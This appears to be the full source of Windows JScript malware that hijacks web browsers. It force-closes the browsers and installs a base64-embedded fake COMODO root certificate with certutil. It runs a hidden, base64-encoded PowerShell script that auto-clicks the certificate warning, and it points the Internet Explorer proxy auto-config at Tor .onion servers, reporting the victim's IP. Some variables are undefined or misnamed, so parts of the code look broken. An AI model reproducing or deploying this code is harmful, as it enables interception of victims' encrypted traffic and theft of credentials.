
var wscript = new ActiveXObject('WScript.Shell');
var filesystem = new ActiveXObject('Scripting.FileSystemObject');

var temp_path = wscript.ExpandEnvironmentStrings('%TEMP%');
var appdata_path = wscript.ExpandEnvironmentStrings('%APPDATA%');
var cert = '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'

var resources = {
    servers: [
        'j65je6flfiejsea2.onion',
        'srj6jqfnn4eobrgn.onion',
        'zgu5v7fzwito746r.onion',
        'mvbcmt5ao7vdbprh.onion'
    ],
    torEntryNodeTlds: [
        'to',
        'link'
    ],
    protocols: [
        'https',
        'https'
    ],
    cert: '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',
    powershell_ie: 'ZnVuY3Rpb24gQ29uZmlybUNlcnR7DQpBZGQtVHlwZSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQoNCnB1YmxpYyBzdGF0aWMgY2xhc3MgV2luMzINCnsNCiAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQ0KICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgRmluZFdpbmRvdyhTdHJpbmcgc0NsYXNzTmFtZSwgU3RyaW5nIHNBcHBOYW1lKTsNCiAgDQogIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0NCiAgc3RhdGljIGV4dGVybiB1aW50IEdldFdpbmRvd1RocmVhZFByb2Nlc3NJZChJbnRQdHIgaFduZCwgb3V0IHVpbnQgbHBkd1Byb2Nlc3NJZCk7DQogIA0KICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildDQogIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQ0KICBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0Rm9yZWdyb3VuZFdpbmRvdyhJbnRQdHIgaFduZCk7DQogIA0KICBwdWJsaWMgZGVsZWdhdGUgYm9vbCBFbnVtV2luZG93UHJvYyhJbnRQdHIgaHduZCwgSW50UHRyIGxQYXJhbSk7DQogIA0KICBbRGxsSW1wb3J0KCJ1c2VyMzIiKV0NCiAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldDQogIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bUNoaWxkV2luZG93cyhJbnRQdHIgd2luZG93LCBFbnVtV2luZG93UHJvYyBjYWxsYmFjaywgSW50UHRyIGxQYXJhbSk7ICANCiAgDQogIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0NCiAgc3RhdGljIGV4dGVybiBJbnRQdHIgU2VuZE1lc3NhZ2UoSW50UHRyIGhXbmQsIFVJbnQzMiBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KICBjb25zdCBpbnQgQk1fQ0xJQ0sgPSAweDAwRjU7ICAgIA0KICBwdWJsaWMgc3RhdGljIHZvaWQgU3RhcnQoKXsNCiAgCUludFB0ciBoV25kOw0KICAJZG97DQogIAkJaFduZCA9IEZpbmRXaW5kb3coIiMzMjc3MCIsIG51bGwpOw0KICAJCWlmICghaFduZC5FcXVhbHMoSW50UHRyLlplcm8pKQ0KICAgICAgICB7DQogICAgICAgIAlTdHJpbmcgc0V4ZU5hbWU9R2V0RXhlTmFtZShoV25kKTsNCiAgCQkJaWYoR2V0RXhlTmFtZShoV25kKS5Db250YWlucygiY3Nyc3MiKSB8fCBHZXRFeGVOYW1lKGhXbmQpLkNvbnRhaW5zKCJjZXJ0dXRpbCIpKQ0KCSAgICAgICAgew0KCQkgICAgICAgIGJyZWFrOw0KCSAgICAgICAgfWVsc2UNCgkgICAgICAgIHsNCgkJICAgICAgICBoV25kPUludFB0ci5aZXJvOw0KCSAgICAgICAgfQ0KICAJCX0NCiAgCX13aGlsZSAoaFduZC5FcXVhbHMoSW50UHRyLlplcm8pKTsNCiAgICBTZXRGb3JlZ3JvdW5kV2luZG93KGhXbmQpOw0KICAJRW51bVdpbmRvd1Byb2MgY2hpbGRQcm9jID0gbmV3IEVudW1XaW5kb3dQcm9jKEVudW1XaW5kb3cpOw0KICAgIEVudW1DaGlsZFdpbmRvd3MoaFduZCwgY2hpbGRQcm9jLCBJbnRQdHIuWmVybyk7DQogIH0NCiAgcHVibGljIHN0YXRpYyBTdHJpbmcgR2V0RXhlTmFtZShJbnRQdHIgaFduZCl7DQogIAl1aW50IHByb2Nlc3NJRCA9IDA7DQogICAgdWludCB0aHJlYWRJRCA9IEdldFdpbmRvd1RocmVhZFByb2Nlc3NJZChoV25kLCBvdXQgcHJvY2Vzc0lEKTsNCiAgICBQcm9jZXNzIHAgPSBQcm9jZXNzLkdldFByb2Nlc3NCeUlkKChpbnQpcHJvY2Vzc0lEKTsNCiAgICByZXR1cm4gcC5Qcm9jZXNzTmFtZS5Ub0xvd2VyKCk7DQogIH0NCiAgcHVibGljIHN0YXRpYyBib29sIEVudW1XaW5kb3coSW50UHRyIGhXbmQsIEludFB0ciBsUGFyYW0pDQogIHsNCiAgCVNlbmRNZXNzYWdlKGhXbmQsIEJNX0NMSUNLLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOw0KICAJcmV0dXJuIHRydWU7DQogIH0NCn0NCiJAOw0KW1dpbjMyXTo6U3RhcnQoKTsNCn0NCkNvbmZpcm1DZXJ0',
    powershell_firefox: ''
};

// Enums and initial values
var adBinaryType = 1
var adFldRowID = 100
var adFldIsNullable = 20
var adFldUnknownUpdatable = 8
var adVarBinary = 204
var ie = null;
var ff = null;
var created_certificate = null;

// Useful functions
var libraries = {
    BinaryDataToFile: function (filename, data) {
		
        var adodb_stream = new ActiveXObject('ADODB.Stream');
        adodb_stream.Open();
        adodb_stream.Type = adBinaryType;
		
        var recordset = new ActiveXObject('ADODB.Recordset');
		// Max Field Size
        var maxSize = data.length * 2;
		// Append(Fieldname, Type, FieldSize,
        recordset.Fields.Append('data', adVarBinary, maxSize, adFldRowID + adFldIsNullable + adFldUnknownUpdatable);
        recordset.Open();
        recordset.AddNew();
        recordset.Fields('data').AppendChunk(data);
        recordset.Update();
        recordset.MoveFirst();
		
        var final_data = recordset('data').GetChunk(max_size);
        recordset.Close();
        adodb_stream.Write(final_data);
        adodb_stream.Position = 0;
		
		// Remove file if exist
        if (filesystem.FileExists(filename)) {
            filesystem.DeleteFile(filename);
        }
		
		// save 
        adodb_stream.SaveToFile(filename);
        adodb_stream.Close();
		
        var source_file = new ActiveXObject('ADODB.Stream');
        source_file.Type = adBinaryType;
        source_file.Open();
        source_file.LoadFromFile(filename);
        source_file.Position = 0;

        var destination_file = new ActiveXObject('ADODB.Stream');
        destination_file.Type = adBinaryType;
        destination_file.Charset = 'ISO-8859-1';
        destination_file.Open();
		
        source_file.CopyTo(destination_file);
        source_file.Close();
        destination_file.SaveToFile(filename, o);
        destination_file.Close();
    },
	// Base64 Decode
	// TODO
    B64Dec: function (s) {
        var z = libraries.B64Dec.dtbl;
        if (undefined === z) {
			// String Range
            var A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var z = libraries.B64Dec.dtbl = new Array(256);
            for (var i = 0; i < z.length; i++) {
                var c = String.fromCharCode(i);
                z[i] = A.indexOf(c);
                if (z[i] < 0)
                    z[i] = 0;
            }
        }
        var B = new Array();
        var C, D, E;
        var F, G, H, I;
        s = s.replace(/[^A-Za-z0-9\+\/\=]/g, '');
        var J = s.length;
        while (61 === s.charCodeAt(J - 1))
            J--;
        var i = 0;
        var K = 4;
        while (K <= J) {
            var L = K + 20480;
            if (L > J)
                L = J;
            for (; K <= L; K += 4) {
                F = z[s.charCodeAt(i++)];
                G = z[s.charCodeAt(i++)];
                H = z[s.charCodeAt(i++)];
                I = z[s.charCodeAt(i++)];
                B.push(String.fromCharCode(F << 2 | G >> 4, (G & 15) << 4 | H >> 2, (H & 3) << 6 | I));
            }
            B = [B.join('')];
        }
        switch (J % 4) {
        case 0:
            break;
        case 2:
            F = z[s.charCodeAt(i++)];
            G = z[s.charCodeAt(i++)];
            B.push(String.fromCharCode(F << 2 | G >> 4));
            break;
        case 3:
            F = z[s.charCodeAt(i++)];
            G = z[s.charCodeAt(i++)];
            H = z[s.charCodeAt(i++)];
            B.push(String.fromCharCode(F << 2 | G >> 4, (G & 15) << 4 | H >> 2));
            break;
        case 1:
        default:
            throw Error('B64Dec(): Unexpected remainder: ' + J % 4 + '(' + J + ', ' + i + ')');
        }
        return B.join('');
    },
	// Generate Random Number
    RandomNumber: function (from, to) {
        from = parseInt(from, 10);
        to = parseInt(to, 10);
        return Math.floor(Math.random() * (to - from + 1)) + from;
    },
	// Generate Random String
    GenStr: function (length, special_char) {
        var iteration = 0;
        var final_string = '';
        var randomNumber;
        if (special_char === undefined) {
            special_char = false;
        }
        while (iteration < length) {
            randomNumber = Math.floor(Math.random() * 100) % 94 + 33;
            if (!special_char) {
                if (randomNumber >= 33 && randomNumber <= 47) {
                    continue;
                }
                if (randomNumber >= 58 && randomNumber <= 64) {
                    continue;
                }
                if (randomNumber >= 91 && randomNumber <= 96) {
                    continue;
                }
                if (randomNumber >= 123 && randomNumber <= 126) {
                    continue;
                }
            }
            iteration++;
            final_string += String.fromCharCode(randomNumber);
        }
        return final_string;
    },
    trim: function (input_string) {
        return input_string.replace(/(^\s+)|(\s+$)/g, '');
    }
};

// TODO
if (!String.format) {
    String.format = function (z) {
        var A = Array.prototype.slice.call(arguments, 1);
        return z.replace(/{(\d+)}/g, function (B, C) {
            return function () {
                try {
                    return A[C].typeof ? A[C].typeof : typeof A[C];
                } catch (e) {
                    return typeof A[C];
                }
            }() != 'undefined' ? A[C] : B;
        });
    };
}

function create_certificate_file() {
    this.FileName = 'cert.der';
    this.Init = function () {
        this.FileName = temp_path + '\\' + this.FileName;
        var data = libraries.B64Dec(resources.cert);
        libraries.BinaryDataToFile(this.FileName, data);
    };
    this.Close = function () {
        if (filesystem.FileExists(this.FileName)) {
            filesystem.DeleteFile(this.FileName);
        }
    };
}

function internet_explorer() {
    this.FileName = 'ps.ps1';
    this.GetIp = function () {
        var http_request = new ActiveXObject('MSXML2.XMLHTTP');
        {
            var error;
            try {
                http_request.open('GET', "http://api.ipify.org/", false);
                http_request.send();
                if (http_request.status == 200) {
                    return libraries.trim(http_request.responseText);
                }
            } catch (_e) {
                error = _e;
                {
                }
            }
        }
        {
            var error;
            try {
                http_request.open('GET', "http://icanhazip.com/", false);
                http_request.send();
                if (http_request.status == 200) {
                    return libraries.trim(http_request.responseText);
                }
            } catch (_e) {
                error = _e;
                {
                    return '';
                }
            }
        }
    };
    this.InstallPac = function () {
        wscript.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoDetect", 0, 'REG_DWORD');
        var random_server_id = libraries.RandomNumber(0, resources.servers.length - 1);
		// Select Random id between 0 and 
        var random_zero_one = libraries.RandomNumber(0, resources.torEntryNodeTld.length - 1);
        for (var i = 0; i < 5; i++) {
            var clientIP = this.GetIp();
			// Check internet connection 
            if (clientIP.length > 0) {

                this.WriteReg(
					String.format('{0}://{1}.{2}/{3}.js?ip={4}', 
					resources.protocols[random_zero_one], // https
					resources.servers[random_server_id], // j65je6flfiejsea2.onion
					resources.torEntryNodeTlds[random_zero_one], // to
					libraries.GenStr(8), // asd23s42
					clientIP) // 1.1.1.1
				);
				
				// Sample URL : https://j65je6flfiejsea2.onion.to/asd23s42.js?ip=1.1.1.1
            }
        }
    };
    this.WriteReg = function (value) {
        wscript.RegWrite('HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL', value, 'REG_SZ');
    };
    this.ConfirmCert = function () {
        this.FileName = temp_path + '\\' + this.FileName;
        var data = libraries.B64Dec(resources.powershell_ie);
        libraries.BinaryDataToFile(this.FileName, data);

        wscript.Run('powershell -ExecutionPolicy Unrestricted -File "' + this.FileName + '"', 0, false);
    };
    this.InstallCert = function () {
        if (!this.IsCertUtilInstalled()) {
			// :|
        }
        this.ConfirmCert();
        wscript.Run('certutil -addstore -f -user "ROOT" "' + created_certificate.FileName + '"', 0, true);
    };
    this.IsCertUtilInstalled = function () {
        {
            var error;
            try {
                wscript.Exec('certutil1 -?');
                return true;
            } catch (_e) {
                error = _e;
                {
                    return false;
                }
            }
        }
    };
    this.Close = function () {
        if (filesystem.FileExists(this.FileName)) {
            filesystem.DeleteFile(this.FileName);
        }
    };
}

function firefox() {
	
    var firefoxProfilesPath = appdata_path + '\Mozilla\Firefox\Profiles';
    this.FileName = 'psf.ps1';
	
    this.GetProfile = function () {
        if (filesystem.FolderExists(firefoxProfilesPath)) {
			
            var profilesDir = filesystem.GetFolder(firefoxProfilesPath).SubFolders;
			
			// Iterate all profiles to find default profile
            if (profilesDir.Count > 0) {
                var e = new Enumerator(profilesDir);
                e.moveFirst();
                while (e.atEnd() == false) {
                    var B = e.item();
                    if (B.Name.indexOf('.default') > -1) {
                        return B.Path;
                    }
                    e.moveNext();
                }
            }
        }
        return false;
    };
	
    this.InstallPac = function () {
		// Get Default profile
        var firefoxDefaultProfilePath = this.GetProfile();
		
        if (firefoxDefaultProfilePath != false) {
			
            var profilePrefsPath = firefoxDefaultProfilePath + '\\prefs.js';
            if (filesystem.FileExists(profilePrefsPath)) {
                var profilePrefsData = filesystem.OpenTextFile(profilePrefsPath, 1).ReadAll();
				
				// Read exist preferences and remove network proxy from it
                var profilePrefsDataLinesArray = profilePrefsData.split('\n');
                var newProfilePrefsDataArray = [];
                for (var i = 0; i < profilePrefsDataLinesArray.length; i++) {
                    if (profilePrefsDataLinesArray[i].indexOf('network.proxy.') == -1) {
                        newProfilePrefsDataArray.push(profilePrefsDataLinesArray[i]);
                    }
                }
				
				// Write new data to preferences file
                newProfilePrefsData = newProfilePrefsDataArray.join('\n');
                var prefsFile = filesystem.CreateTextFile(profilePrefsPath, true);
                prefsFile.Write(newProfilePrefsData);
                prefsFile.Close();
            }
        }
    };
    this.InstallCert = function () {
		// psf.ps1
        this.FileName = temp_path + '\\' + this.FileName;
        var decoded_psf = libraries.B64Dec(resources.powershell_firefox);
        file_data = decoded_psf.replace('%CERT%', resources.cert);
        libraries.BinaryDataToFile(this.FileName, file_data);
		
		// powershell -ExecutionPolicy Unrestricted -File "%TMP%\psf.ps1"
        wscript.Run('powershell -ExecutionPolicy Unrestricted -File "' + this.FileName + '"', 0, false);
    };
    this.Close = function () {
        if (filesystem.FileExists(this.FileName)) {
            filesystem.DeleteFile(this.FileName);
        }
    };
}

function main() {
    this.Init = function () {
        certificate = new create_certificate_file();
        certificate.Init();
        ie = new internet_explorer();
        ff = new firefox();
    };
    this.Start = function () {
        this.Init();
        this.CloseAllBrowsers();
        this.InstallIE();
        this.InstallFF();
        WScript.Sleep(5000);
        this.Close();
    };
    this.InstallIE = function () {
        ie.InstallCert();
        ie.InstallPac();
    };
    this.InstallFF = function () {
        ff.InstallCert();
        ff.InstallPac();
    };
    this.CloseAllBrowsers = function () {
        wscript.Run('taskkill /F /im iexplore.exe', 0, false);
        wscript.Run('taskkill /F /im firefox.exe', 0, false);
        wscript.Run('taskkill /F /im chrome.exe', 0, false);
    };
    this.Close = function () {
        certificate.Close();
        ie.Close();
        ff.Close();
    };
}
var main_object = new main();
main_object.Start();